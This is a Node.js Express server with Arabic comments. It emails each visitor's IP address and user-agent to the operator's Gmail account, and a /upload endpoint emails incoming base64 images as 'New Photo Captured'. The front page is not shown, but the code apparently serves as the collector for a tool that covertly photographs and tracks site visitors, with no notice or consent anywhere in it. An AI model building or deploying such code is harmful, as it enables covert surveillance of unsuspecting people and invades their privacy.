const express = require('express');
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();
app.use(bodyParser.json({ limit: '10mb' }));

// إعداد ناقل البريد الإلكتروني مرة وحدة فقط
let transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.GMAIL_USER,
    pass: process.env.GMAIL_PASS
  }
});

// رصد الدخول على الصفحة الرئيسية
app.get('/', (req, res) => {
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.socket.remoteAddress;
  const userAgent = req.headers['user-agent'];

  let mailOptions = {
    from: process.env.GMAIL_USER,
    to: process.env.GMAIL_USER,
    subject: 'دخول زائر جديد للموقع',
    text: `تم دخول زائر على الموقع\n\nIP: ${ip}\nUser-Agent: ${userAgent}`
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error('Error sending visitor email:', error);
    } else {
      console.log('Visitor email sent:', info.response);
    }
  });

  res.sendFile(path.join(__dirname, 'index.html'));
});

// استقبال رفع الصورة وإرسالها بالإيميل
app.post('/upload', async (req, res) => {
  const image = req.body.image;

  let mailOptions = {
    from: process.env.GMAIL_USER,
    to: process.env.GMAIL_USER,
    subject: 'New Photo Captured',
    html: '<p>Attached image from site.</p>',
    attachments: [{
      filename: 'photo.png',
      content: image.split("base64,")[1],
      encoding: 'base64'
    }]
  };

  try {
    await transporter.sendMail(mailOptions);
    res.sendStatus(200);
  } catch (error) {
    console.error('Email error:', error);
    res.sendStatus(500);
  }
});

// خدمة الملفات الثابتة (CSS، JS، صور، إلخ)
app.use(express.static(__dirname));

// تشغيل السيرفر على البورت المحدد من البيئة أو 3000
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
